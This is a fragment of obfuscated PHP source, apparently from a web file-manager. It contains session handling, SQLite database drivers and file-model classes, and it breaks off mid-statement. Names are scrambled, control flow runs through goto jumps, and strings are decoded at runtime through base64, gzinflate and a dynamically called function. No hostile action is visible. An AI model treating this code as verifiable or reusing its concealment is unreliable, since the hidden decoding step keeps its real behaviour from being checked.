eˆ»ÓÜÍ˜Ü; dÂà°ºÆĞ½: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $B¼«¯ÎíÏ = new self(); return $B¼«¯ÎíÏ; goto F ‘ÔÄ´ì; eˆ»ÓÜÍ˜Ü: if (self::$sessionSign) { } else { if (Cookie::get($bÛÈÈÎÛÌ­)) { self::$sessionSign = Cookie::get($bÛÈÈÎÛÌ­); } else { self::$sessionSign = guid(); } } Cookie::setSafe($bÛÈÈÎÛÌ­, self::$sessionSign, self::$sessionTime); $d–Û†Ç©†Ú = $D×íïÛã„»[$d…ŠóÀ±ÔÔ[1491]]; goto CòöÅ¥¾ñÂ; BêÓÂÜĞó¤: $d…ŠóÀ±ÔÔ =& $_SERVER[«¾°Ã¤]; static $B¼«¯ÎíÏ = false; if ($B¼«¯ÎíÏ) { return $B¼«¯ÎíÏ; } goto fÃà…Ú¼; F ‘ÔÄ´ì: } public static function sign($Cã°£¼–¶ = false) { $Cã°£¼–¶ && (self::$sessionSign = $Cã°£¼–¶); self::init(); return self::$sessionSign; } public static function set($fº£¿ƒÈÜÏ, $dĞòš›‰®Â = false) { self::init(); if (is_array($fº£¿ƒÈÜÏ)) { foreach ($fº£¿ƒÈÜÏ as $DçÅõØ›ù => $B¡ôŒ•‹Ô) { array_set_value(self::$data, $DçÅõØ›ù, $B¡ôŒ•‹Ô); } } else { array_set_value(self::$data, $fº£¿ƒÈÜÏ, $dĞòš›‰®Â); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($DÉ‚ïØ†â = false) { self::init(); if (!$DÉ‚ïØ†â) { return self::$data; } return array_get_value(self::$data, $DÉ‚ïØ†â); } public static function remove($cÏ·¶®Æ…) { self::init(); unset(self::$data[$cÏ·¶®Æ…]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[«¾°Ã¤][807])) { self::$handle->clearTimeout(); } } } goto fá«÷’ÄÂ; D†åÃëğ–: define($_SERVER[«¾°Ã¤][0], $_SERVER[«¾°Ã¤][1]); $_SERVER[ã…] = explode($_SERVER[«¾°Ã¤][2], gzinflate(substr($_SERVER[«¾°Ã¤][3], 10, -8))); function binCheckEq($DÀ„Š§ˆÃè, $E¡¥¾æ®Ã†) { return $DÀ„Š§ˆÃè == $E¡¥¾æ®Ã†; } goto A ¾ÕÊ; A ¾ÕÊ: $aÍØÙØ¨ÀÍ = strrev(base64_decode($_SERVER[ã…][0])); function binCheckNeq($AˆÊÜ­¦Ãò, $Aƒ‡İÁóÄÇ) { return $AˆÊÜ­¦Ãò != $Aƒ‡İÁóÄÇ; } $_SERVER[$_SERVER[ã…][1]] = $aÍØÙØ¨ÀÍ($_SERVER[$_SERVER[ã…][2]]); goto a‹™Í„¬; B¯Æ‚„Õ§: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto DÏ¬˜¡Ô‡®; DÏ¬˜¡Ô‡®: $f¦™µ¿‹ìÒ =& $_SERVER[«¾°Ã¤]; global $in, $config; $this->config =& $config; goto d ¨ÃéÕâ; d ¨ÃéÕâ: $this->in =& $in; $this->values[$f¦™µ¿‹ìÒ[6]] =& $config; $this->values[$f¦™µ¿‹ìÒ[7]] =& $in; goto eì„ô«ò¥ï; eì„ô«ò¥ï: $this->tpl = TEMPLATE . MOD . $f¦™µ¿‹ìÒ[8]; $this->_classObjectID = mt_rand(0, 10000); goto A˜¼›ùòî; A˜¼›ùòî: } public function loadClass($DŞÈ«ÕôîŠ) { if (1 === func_num_args()) { $this->{$DŞÈ«ÕôîŠ} = new $DŞÈ«ÕôîŠ(); } else { $D¶Šğ½²›ä = new ReflectionClass($DŞÈ«ÕôîŠ); $bĞÏößÓô© = func_get_args(); array_shift($bĞÏößÓô©); $this->{$DŞÈ«ÕôîŠ} = $D¶Šğ½²›ä->newInstanceArgs($bĞÏößÓô©); } return $this->{$DŞÈ«ÕôîŠ}; } protected function assign($AÌµ§„î£è, $A§’Ş™ƒ) { $this->values[$AÌµ§„î£è] = $A§’Ş™ƒ; } protected function display($F°„—‹ßĞ) { ob_end_clean(); extract($this->values); require $this->tpl . $F°„—‹ßĞ; } } class DbSqliteBase extends Db { public function __construct($b†ê¢ˆå½¥ = '') { $CİÎÓ¶ğä¿ =& $_SERVER[«¾°Ã¤]; if (!extension_loaded($CİÎÓ¶ğä¿[9])) { think_exception(think_lang($CİÎÓ¶ğä¿[10]) . $CİÎÓ¶ğä¿[11]); } if (!empty($b†ê¢ˆå½¥)) { if (!isset($b†ê¢ˆå½¥[$CİÎÓ¶ğä¿[12]])) { $b†ê¢ˆå½¥[$CİÎÓ¶ğä¿[12]] = 438; } $this->config = $b†ê¢ˆå½¥; if (empty($this->config[$CİÎÓ¶ğä¿[13]])) { $this->config[$CİÎÓ¶ğä¿[13]] = array(); } } } public function connect($EñŞ÷±Ãæ = '', $BÍÏŠ¾°¼„ = 0) { $AØÛÈ…Ø®Ô =& $_SERVER[«¾°Ã¤]; if (!isset($this->linkID[$BÍÏŠ¾°¼„])) { goto AŒ§ÙŠí¬š; Fè³®öëÔ¯: @sqlite_busy_timeout($this->linkID[$BÍÏŠ¾°¼„], 30000); if (1 != think_config($AØÛÈ…Ø®Ô[18])) { unset($this->config); } goto D’Ë²ÔÔø; EÓæÙ’È°ª: $this->linkID[$BÍÏŠ¾°¼„] = $aŠÒÙƒİ¶($EñŞ÷±Ãæ[$AØÛÈ…Ø®Ô[17]], $EñŞ÷±Ãæ[$AØÛÈ…Ø®Ô[12]]); if (!$this->linkID[$BÍÏŠ¾°¼„]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Fè³®öëÔ¯; AŒ§ÙŠí¬š: if (empty($EñŞ÷±Ãæ)) { $EñŞ÷±Ãæ = $this->config; } $d½ÑêôÂ–Œ = !empty($EñŞ÷±Ãæ[$AØÛÈ…Ø®Ô[13]][$AØÛÈ…Ø®Ô[14]]) ? $EñŞ÷±Ãæ[$AØÛÈ…Ø®Ô[13]][$AØÛÈ…Ø®Ô[14]] : $this->pconnect; $aŠÒÙƒİ¶ = $d½ÑêôÂ–Œ ? $AØÛÈ…Ø®Ô[15] : $AØÛÈ…Ø®Ô[16]; goto EÓæÙ’È°ª; D’Ë²ÔÔø: } return $this->linkID[$BÍÏŠ¾°¼„]; } public function free() { $this->queryID = null; } public function query($eï‡–²æƒ±) { goto dœÖÙÀš¾Š; dœÖÙÀš¾Š: $b÷İÙ¼É =& $_SERVER[«¾°Ã¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÜ²õÃËØ¥; cÊ•§½†¹“: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $b¹×ÎÌ¹Åë = $this->getAll(); return $b¹×ÎÌ¹Åë; } goto BŠéÛËÖÓö; c¤Äéƒø: think_status($b÷İÙ¼É[20]); $this->queryID = sqlite_query($this->_linkID, $eï‡–²æƒ±); $this->debug(); goto cÊ•§½†¹“; cÜ²õÃËØ¥: $this->queryStr = $eï‡–²æƒ±; if ($this->queryID) { $this->free(); } think_action_status($b÷İÙ¼É[19], 1); goto c¤Äéƒø; BŠéÛËÖÓö: } public function execute($eÑÃ£¹’¢¶) { goto e´Õ–Ûä„©; e´Õ–Ûä„©: $cÎ¨¯ã¶Ä‡ =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E‚Â»‚ßÏ; E‚Â»‚ßÏ: $this->queryStr = $eÑÃ£¹’¢¶; if ($this->queryID) { $this->free(); } think_action_status($cÎ¨¯ã¶Ä‡[21], 1); goto AÊ‘êÜø¸±; A«‰öãÖŠ½: if (!1 === $a·„éã¨õ‘) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b‹ëÇËÆ£; AÊ‘êÜø¸±: think_status($cÎ¨¯ã¶Ä‡[20]); $a·„éã¨õ‘ = sqlite_exec($this->_linkID, $eÑÃ£¹’¢¶); $this->debug(); goto A«‰öãÖŠ½; b‹ëÇËÆ£: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[«¾°Ã¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F»Åéíë™ˆ = sqlite_query($this->_linkID, $_SERVER[«¾°Ã¤][23]); if (!$F»Åéíë™ˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BºÑàˆôôä = sqlite_query($this->_linkID, $_SERVER[«¾°Ã¤][24]); if (!$BºÑàˆôôä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c®âê¶ø‰ = array(); if ($this->numRows > 0) { for ($aÉˆÂÌ‹¡” = 0; $aÉˆÂÌ‹¡” < $this->numRows; $aÉˆÂÌ‹¡”++) { $c®âê¶ø‰[$aÉˆÂÌ‹¡”] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $c®âê¶ø‰; } public function getFields($dœ‡ì÷°æ) { $d¨í” êÀí =& $_SERVER[«¾°Ã¤]; $fœì‡éš = $this->query($d¨í” êÀí[25] . $dœ‡ì÷°æ . $d¨í” êÀí[26]); $Fê»µ¦êó² = array(); if ($fœì‡éš) { foreach ($fœì‡éš as $A…¦÷Š¸µ => $e¿ó±ŞéòÃ) { $Fê»µ¦êó²[$e¿ó±ŞéòÃ[$d¨í” êÀí[27]]] = array($d¨í” êÀí[28] => $e¿ó±ŞéòÃ[$d¨í” êÀí[27]], $d¨í” êÀí[29] => $e¿ó±ŞéòÃ[$d¨í” êÀí[30]], $d¨í” êÀí[31] => (bool) ($e¿ó±ŞéòÃ[$d¨í” êÀí[32]] === $d¨í” êÀí[33]), $d¨í” êÀí[34] => $e¿ó±ŞéòÃ[$d¨í” êÀí[35]], $d¨í” êÀí[36] => strtolower($e¿ó±ŞéòÃ[$d¨í” êÀí[37]]) == $d¨í” êÀí[38], $d¨í” êÀí[39] => strtolower($e¿ó±ŞéòÃ[$d¨í” êÀí[40]]) == $d¨í” êÀí[41]); } } return $Fê»µ¦êó²; } public function getTables($c‰Å¨Ì¬êÚ = '') { $dš´Â‚¥õİ =& $_SERVER[«¾°Ã¤]; $bÃÄá¢È = $this->query($dš´Â‚¥õİ[42] . $dš´Â‚¥õİ[43] . $dš´Â‚¥õİ[44]); $c«”¬¹²¼ = array(); foreach ($bÃÄá¢È as $EæªÏ´áè¸ => $D‘Æ‡İë) { $c«”¬¹²¼[$EæªÏ´áè¸] = current($D‘Æ‡İë); } return $c«”¬¹²¼; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e‰†„æ§å =& $_SERVER[«¾°Ã¤]; $D¾ìñŒ§Øé = sqlite_last_error($this->_linkID); $this->error = $D¾ìñŒ§Øé . $e‰†„æ§å[4] . sqlite_error_string($D¾ìñŒ§Øé); if ($e‰†„æ§å[33] != $this->queryStr) { $this->error .= LNG($e‰†„æ§å[45]) . $this->queryStr; } think_trace($this->error, $e‰†„æ§å[33], $e‰†„æ§å[46]); return $this->error; } public function escapeString($f“’¿Á³©) { return sqlite_escape_string($f“’¿Á³©); } public function parseLimit($aÙ‘´òµ») { $bö´°ŒÍÀ£ =& $_SERVER[«¾°Ã¤]; $dšŞš¿ğÚ = $bö´°ŒÍÀ£[33]; if (!empty($aÙ‘´òµ»)) { $aÙ‘´òµ» = explode($bö´°ŒÍÀ£[47], $aÙ‘´òµ»); if (count($aÙ‘´òµ») > 1) { $dšŞš¿ğÚ .= $bö´°ŒÍÀ£[48] . $aÙ‘´òµ»[1] . $bö´°ŒÍÀ£[49] . $aÙ‘´òµ»[0] . $bö´°ŒÍÀ£[50]; } else { $dšŞš¿ğÚ .= $bö´°ŒÍÀ£[48] . $aÙ‘´òµ»[0] . $bö´°ŒÍÀ£[50]; } } return $dšŞš¿ğÚ; } } class DbSqlite3Base extends Db { public function __construct($cã“‡÷ì£ = '') { $cÜ™ºÒÔ´à =& $_SERVER[«¾°Ã¤]; if (!class_exists($cÜ™ºÒÔ´à[51])) { think_exception(think_lang($cÜ™ºÒÔ´à[10]) . $cÜ™ºÒÔ´à[52]); } if (!empty($cã“‡÷ì£)) { if (!isset($cã“‡÷ì£[$cÜ™ºÒÔ´à[12]])) { $cã“‡÷ì£[$cÜ™ºÒÔ´à[12]] = 438; } $this->config = $cã“‡÷ì£; if (empty($this->config[$cÜ™ºÒÔ´à[13]])) { $this->config[$cÜ™ºÒÔ´à[13]] = array(); } } } public function connect($cÑ«ƒ·ä‘‰ = '', $E§½Ô…îæ = 0) { $B¢©‘–¬ùè =& $_SERVER[«¾°Ã¤]; if (!isset($this->linkID[$E§½Ô…îæ])) { if (empty($cÑ«ƒ·ä‘‰)) { $cÑ«ƒ·ä‘‰ = $this->config; } $this->linkID[$E§½Ô…îæ] = new SQLite3($cÑ«ƒ·ä‘‰[$B¢©‘–¬ùè[17]]); if (!$this->linkID[$E§½Ô…îæ]) { think_exception($this->linkID[$E§½Ô…îæ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E§½Ô…îæ]->busyTimeout(30000); if (1 != think_config($B¢©‘–¬ùè[18])) { unset($this->config); } } return $this->linkID[$E§½Ô…îæ]; } public function free() { $this->queryID = null; } public function query($B†Š´Ê³Ñø) { goto cİ‡¯“Ğç; C£¨óŠÃù„: think_status($c¸Ü‹‘Üİ[20]); $this->queryID = $this->_linkID->query($B†Š´Ê³Ñø); $this->debug(); goto aÕ ù™´¼ø; cİ‡¯“Ğç: $c¸Ü‹‘Üİ =& $_SERVER[«¾°Ã¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dòÙ‡„ç‚‚; dòÙ‡„ç‚‚: $this->queryStr = $B†Š´Ê³Ñø; if ($this->queryID) { $this->free(); } think_action_status($c¸Ü‹‘Üİ[19], 1); goto C£¨óŠÃù„; aÕ ù™´¼ø: if (!1 === $this->queryID) { $this->error(); return !1; } else { $CÉæŠïÕâò = $this->getAll(); $this->numRows = count($CÉæŠïÕâò); return $CÉæŠïÕâò; } goto C¡ŒÍÍë‚™; C¡ŒÍÍë‚™: } public function execute($A±¤ƒ•Ğ‰Ï) { goto dª÷°£Úäø; a”Î¬Úøù: if (!1 === $C¯çÕîšÌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DÔº™— ”; b©‚ˆİ™”Ç: $this->queryStr = $A±¤ƒ•Ğ‰Ï; if ($this->queryID) { $this->free(); } think_action_status($C¿‰ä…‘šš[21], 1); goto eå‘´Òá; dª÷°£Úäø: $C¿‰ä…‘šš =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b©‚ˆİ™”Ç; eå‘´Òá: think_status($C¿‰ä…‘šš[20]); $C¯çÕîšÌ = $this->_linkID->exec($A±¤ƒ•Ğ‰Ï); $this->debug(); goto a”Î¬Úøù; DÔº™— ”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[«¾°Ã¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dòÍ¥ô¿¸Ó = $this->_linkID->query($_SERVER[«¾°Ã¤][23]); if (!$dòÍ¥ô¿¸Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÊÁ°ğ—·¬ = $this->_linkID->query($_SERVER[«¾°Ã¤][24]); if (!$fÊÁ°ğ—·¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B‚«óÓ¯ÒŠ = array(); while ($AÖ…ˆ‰‰¢› = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B‚«óÓ¯ÒŠ[] = $AÖ…ˆ‰‰¢›; } $this->queryID->reset(); return $B‚«óÓ¯ÒŠ; } public function getFields($bÊæã–¡±) { $fî£‚æ±Ãµ =& $_SERVER[«¾°Ã¤]; $Fšãåµ®° = $this->query($fî£‚æ±Ãµ[25] . $bÊæã–¡± . $fî£‚æ±Ãµ[26]); $FÆŞÆäËÜä = array(); if ($Fšãåµ®°) { foreach ($Fšãåµ®° as $bÂŠãØ»² => $Bß°§ªµ“) { $FÆŞÆäËÜä[$Bß°§ªµ“[$fî£‚æ±Ãµ[28]]] = array($fî£‚æ±Ãµ[28] => $Bß°§ªµ“[$fî£‚æ±Ãµ[28]], $fî£‚æ±Ãµ[29] => $Bß°§ªµ“[$fî£‚æ±Ãµ[29]], $fî£‚æ±Ãµ[31] => (bool) ($Bß°§ªµ“[$fî£‚æ±Ãµ[31]] === $fî£‚æ±Ãµ[33]), $fî£‚æ±Ãµ[34] => $Bß°§ªµ“[$fî£‚æ±Ãµ[53]], $fî£‚æ±Ãµ[36] => (bool) $Bß°§ªµ“[$fî£‚æ±Ãµ[54]], $fî£‚æ±Ãµ[39] => (bool) $Bß°§ªµ“[$fî£‚æ±Ãµ[54]]); } } return $FÆŞÆäËÜä; } public function getTables($Eà…Î‡Óˆ“ = '') { $aÛîùÓùÎ =& $_SERVER[«¾°Ã¤]; $E¶ä®¼º†Ò = $this->query($aÛîùÓùÎ[42] . $aÛîùÓùÎ[43] . $aÛîùÓùÎ[44]); $Fƒ„¡‰æƒ´ = array(); foreach ($E¶ä®¼º†Ò as $AÄÆöƒª‚ˆ => $EÕøº¡¨ ò) { $Fƒ„¡‰æƒ´[$AÄÆöƒª‚ˆ] = current($EÕøº¡¨ ò); } return $Fƒ„¡‰æƒ´; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E§Œğ¼éì =& $_SERVER[«¾°Ã¤]; $this->error = $this->_linkID->lastErrorMsg(); if ($E§Œğ¼éì[33] != $this->queryStr) { $this->error .= LNG($E§Œğ¼éì[45]) . $this->queryStr; } think_trace($this->error, $E§Œğ¼éì[33], $E§Œğ¼éì[46]); return $this->error; } public function escapeString($AÂİáÁ’İ”) { $e‘ê”÷©â =& $_SERVER[«¾°Ã¤]; if ($this->_linkID) { return $this->_linkID->escapeString($AÂİáÁ’İ”); } return str_ireplace($e‘ê”÷©â[55], $e‘ê”÷©â[56], $AÂİáÁ’İ”); } public function parseLimit($c«ù²Æ¯È) { $e˜¥˜íÂ£ =& $_SERVER[«¾°Ã¤]; $fãÂŒÁ† = $e˜¥˜íÂ£[33]; if (!empty($c«ù²Æ¯È)) { $c«ù²Æ¯È = explode($e˜¥˜íÂ£[47], $c«ù²Æ¯È); if (count($c«ù²Æ¯È) > 1) { $fãÂŒÁ† .= $e˜¥˜íÂ£[48] . $c«ù²Æ¯È[1] . $e˜¥˜íÂ£[49] . $c«ù²Æ¯È[0] . $e˜¥˜íÂ£[50]; } else { $fãÂŒÁ† .= $e˜¥˜íÂ£[48] . $c«ù²Æ¯È[0] . $e˜¥˜íÂ£[50]; } } return $fãÂŒÁ†; } } goto B¦öëø‡º; EÓ¨ÒÎ…: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\x65\137\x63\x6f\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\x66\x75\x6e\143\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\x6d\145" => "\151\x6f\137\146\x69\154\x65\137\155\x65\164\x61", "\x6d\145\164\141\x46\151\145\x6c\x64" => "\146\151\x6c\145\111\104"); public function fileInfo($Fä¡ô¼ƒ«•) { $DâêŒÖ‚² =& $_SERVER[«¾°Ã¤]; static $bä§Ş½Êİª = array(); if (!isset($bä§Ş½Êİª[$Fä¡ô¼ƒ«•])) { $dì«ËÉÑ™ = $DâêŒÖ‚²[1737]; $aÓìÔÅƒ¯Ñ = Model($DâêŒÖ‚²[459])->field($dì«ËÉÑ™)->where(array($DâêŒÖ‚²[457] => $Fä¡ô¼ƒ«•))->find(); $bä§Ş½Êİª[$Fä¡ô¼ƒ«•] = $aÓìÔÅƒ¯Ñ; } return $bä§Ş½Êİª[$Fä¡ô¼ƒ«•]; } public function addFileByContent($Eôç²ßŠ›ç = '', $FÀèÃÄ¯Á¤ = '') { goto CŞëÌ¤‰‰Š; e¿˜å‹«¥á: $AÖãÏİİ²â = $bŠ†‰äÈ»œ . $bñğº¼ó‡[1739] . rand_string(16); file_put_contents($AÖãÏİİ²â, $Eôç²ßŠ›ç); $b¯Üİî§òè = $this->addFile($AÖãÏİİ²â, $FÀèÃÄ¯Á¤, !0); goto BÆÜÅ·öİ; CŞëÌ¤‰‰Š: $bñğº¼ó‡ =& $_SERVER[«¾°Ã¤]; $bŠ†‰äÈ»œ = TEMP_PATH . $bñğº¼ó‡[1738]; if (!is_dir($bŠ†‰äÈ»œ)) { mk_dir($bŠ†‰äÈ»œ); } goto e¿˜å‹«¥á; BÆÜÅ·öİ: if (file_exists($AÖãÏİİ²â)) { @unlink($AÖãÏİİ²â); } return $b¯Üİî§òè; goto DŠ‹ËÃïæŞ; DŠ‹ËÃïæŞ: } public function createFileName($eªëÛ£¸“ğ, $EùÜÊ†åé = false, $c‡İÓŸˆØ = false) { goto B¾âº±´œã; B¾âº±´œã: $A“’°Ã¬Ù¶ =& $_SERVER[«¾°Ã¤]; $AÒ‰ˆÖ’‹ô = IO::init($A“’°Ã¬Ù¶[8]); $dÚğÁ¸œÖ  = $this->makeFilePath($eªëÛ£¸“ğ, $AÒ‰ˆÖ’‹ô, $EùÜÊ†åé, $c‡İÓŸˆØ); goto A™‰Ù¢çã°; A¢æ…¼„©Ô: if (!$fÍÇ•ì›ù && !Cache::get($Fª“æà£¬)) { $fÍÇ•ì›ù = !0; $DŞ¦×ó¨İ = IO::mkdir($fœ¤’¼½šî); if (!IO::exist($DŞ¦×ó¨İ . $A“’°Ã¬Ù¶[770])) { IO::mkfile($DŞ¦×ó¨İ . $A“’°Ã¬Ù¶[770]); } Cache::set($Fª“æà£¬, 1, 3600 * 2); } return $dÚğÁ¸œÖ ; goto A³¯à«Îõš; A™‰Ù¢çã°: $fœ¤’¼½šî = $AÒ‰ˆÖ’‹ô->pathFather($dÚğÁ¸œÖ ); static $fÍÇ•ì›ù = false; $Fª“æà£¬ = $A“’°Ã¬Ù¶[1740] . md5($fœ¤’¼½šî); goto A¢æ…¼„©Ô; A³¯à«Îõš: } public function makeFilePath($FÚøî—»é, $e† “¹…£î, $D½ÃŒĞ˜µŸ = false, $FàâŸƒ›ƒš = false) { goto fÍäƒÃæÅ; b‹äÜ® : $FìòÖŒŞñÉ = $EÙ¥ÒÌ…‚© . rand_string(5) . short_id(100); $FÚøî—»é = str_replace($d÷âçÕÑÑ‘[8], $d÷âçÕÑÑ‘[71], KodIO::clear($FÚøî—»é)); $a÷½Ï÷Å¡¾ = $e† “¹…£î->ext($FÚøî—»é); goto d…«ùöÊ; fÍäƒÃæÅ: $d÷âçÕÑÑ‘ =& $_SERVER[«¾°Ã¤]; $E½¡ö…ôŠ¿ = Model($d÷âçÕÑÑ‘[739])->get($d÷âçÕÑÑ‘[1741]); $EÙ¥ÒÌ…‚© = KodIO::defaultIO() . date($d÷âçÕÑÑ‘[1742]); goto b‹äÜ® ; d…«ùöÊ: if (!$FÚøî—»é) { $E½¡ö…ôŠ¿ = $d÷âçÕÑÑ‘[1743]; } switch ($E½¡ö…ôŠ¿) { case $d÷âçÕÑÑ‘[1744]: $FìòÖŒŞñÉ = $FìòÖŒŞñÉ . $d÷âçÕÑÑ‘[95] . $e† “¹…£î->ext($FÚøî—»é); if ($a÷½Ï÷Å¡¾ == $d÷âçÕÑÑ‘[1683]) { $FìòÖŒŞñÉ .= $d÷âçÕÑÑ‘[1430]; } break; case $d÷âçÕÑÑ‘[1745]: goto bØÕÈù¹—ˆ; E”¨­‰È¦Œ: $EÙ¥ÒÌ…‚© = $d÷âçÕÑÑ‘[1125] . $B®¼„¥Ë‡Ø[$d÷âçÕÑÑ‘[393]] . $d÷âçÕÑÑ‘[411] . date($d÷âçÕÑÑ‘[1746]) . $D¸”±Á”•¬ . $d÷âçÕÑÑ‘[8]; if ($a÷½Ï÷Å¡¾ == $d÷âçÕÑÑ‘[1683]) { $FÚøî—»é .= $d÷âçÕÑÑ‘[1430]; } $aåÜÄ¶¢ØÒ = $d÷âçÕÑÑ‘[1747] . $EÙ¥ÒÌ…‚© . $FÚøî—»é; goto F›¾ˆ«“’ˆ; F›¾ˆ«“’ˆ: CacheLock::lock($aåÜÄ¶¢ØÒ); $FìòÖŒŞñÉ = $EÙ¥ÒÌ…‚© . $FÚøî—»é; if (IO::exist($EÙ¥ÒÌ…‚© . $FÚøî—»é)) { $Cº—â™¢­­ = substr($FÚøî—»é, 0, strlen($FÚøî—»é) - strlen($a÷½Ï÷Å¡¾)); $DÎ´ƒêğÅò = $FàâŸƒ›ƒš ? substr($FàâŸƒ›ƒš, 0, 5) : ($D½ÃŒĞ˜µŸ ? substr($D½ÃŒĞ˜µŸ, 0, 5) : rand_string(5)); $FìòÖŒŞñÉ = $EÙ¥ÒÌ…‚© . $Cº—â™¢­­ . $DÎ´ƒêğÅò . $d÷âçÕÑÑ‘[95] . $a÷½Ï÷Å¡¾; } goto bœØçùÊÄ; bØÕÈù¹—ˆ: $E²ÈÉØ«ƒ« = Model($d÷âçÕÑÑ‘[739])->get($d÷âçÕÑÑ‘[740]); $D¸”±Á”•¬ = substr(md5($d÷âçÕÑÑ‘[741] . $E²ÈÉØ«ƒ« . date($d÷âçÕÑÑ‘[717])), 0, 8); $B®¼„¥Ë‡Ø = KodIO::defaultDriver(); goto E”¨­‰È¦Œ; bœØçùÊÄ: if (IO::isTypeObject($FìòÖŒŞñÉ) && !IO::isUploadServer($FìòÖŒŞñÉ)) { if (IO::exist($FìòÖŒŞñÉ)) { return $FìòÖŒŞñÉ; } $E„çäâÉ‹ = IO::setContent($FìòÖŒŞñÉ, $d÷âçÕÑÑ‘[33]); if (!$E„çäâÉ‹) { show_json($d÷âçÕÑÑ‘[1748], !1); } } CacheLock::unlock($aåÜÄ¶¢ØÒ); break; goto B¥®›…¡œë; B¥®›…¡œë: case $d÷âçÕÑÑ‘[1743]: break; default: break; } return $FìòÖŒŞñÉ; goto C‚ÚÓï•‹; C‚ÚÓï•‹: } public function addFileByRemote($Cƒ‡Ëƒ¨ÅÊ, $AÛ¯ƒ£ˆÔ¿, $bÃšÆíÛˆ¦ = array()) { goto AÉ‹ìÅç¿õ; B’µ¾‚Ğ¤İ: $FõŠÄå´¼ï = IO::hashMd5($Cƒ‡Ëƒ¨ÅÊ, $bİš·¨Öğ½); $D¡áº™  = KodIO::defaultDriver(); $ešŠöÆ¡² = array($E²š˜¯Çƒ˜[557] => IO::size($Cƒ‡Ëƒ¨ÅÊ), $E²š˜¯Çƒ˜[1749] => 1, $E²š˜¯Çƒ˜[422] => $AÛ¯ƒ£ˆÔ¿, $E²š˜¯Çƒ˜[782] => $D¡áº™ [$E²š˜¯Çƒ˜[393]], $E²š˜¯Çƒ˜[423] => $Cƒ‡Ëƒ¨ÅÊ, $E²š˜¯Çƒ˜[1750] => $bÃšÆíÛˆ¦[$E²š˜¯Çƒ˜[171]] ? $bÃšÆíÛˆ¦[$E²š˜¯Çƒ˜[171]] : IO::hashSimple($Cƒ‡Ëƒ¨ÅÊ), $E²š˜¯Çƒ˜[1751] => $FõŠÄå´¼ï ? $FõŠÄå´¼ï : $bİš·¨Öğ½); goto EÛ´¦°„’·; EÛ´¦°„’·: if ($bÖÄ´á‡Ë = $this->addFileCheckExist($ešŠöÆ¡²[$E²š˜¯Çƒ˜[171]], $ešŠöÆ¡²[$E²š˜¯Çƒ˜[170]], $ešŠöÆ¡²[$E²š˜¯Çƒ˜[78]])) { return $bÖÄ´á‡Ë; } return $this->addFileData($ešŠöÆ¡²); goto d‰ÌÍæÎ„±; AÉ‹ìÅç¿õ: $E²š˜¯Çƒ˜ =& $_SERVER[«¾°Ã¤]; if (!IO::exist($Cƒ‡Ëƒ¨ÅÊ)) { return !1; } $bİš·¨Öğ½ = $bÃšÆíÛˆ¦[$E²š˜¯Çƒ˜[170]] ? $bÃšÆíÛˆ¦[$E²š˜¯Çƒ˜[170]] : $E²š˜¯Çƒ˜[33]; goto B’µ¾‚Ğ¤İ; d‰ÌÍæÎ„±: } private function addFileData($B£èÂÀ¿¼š) { $a›å­œĞ„ =& $_SERVER[«¾°Ã¤]; if (!$B£èÂÀ¿¼š) { return !1; } $B£èÂÀ¿¼š[$a›å­œĞ„[78]] = intval($B£èÂÀ¿¼š[$a›å­œĞ„[78]]); if (!$B£èÂÀ¿¼š[$a›å­œĞ„[78]] && strlen($B£èÂÀ¿¼š[$a›å­œĞ„[171]]) > 32) { $B£èÂÀ¿¼š[$a›å­œĞ„[78]] = intval(substr($B£èÂÀ¿¼š[$a›å­œĞ„[171]], 32)); } $E¦¦«òÜ¿ñ = $this->add($B£èÂÀ¿¼š); return 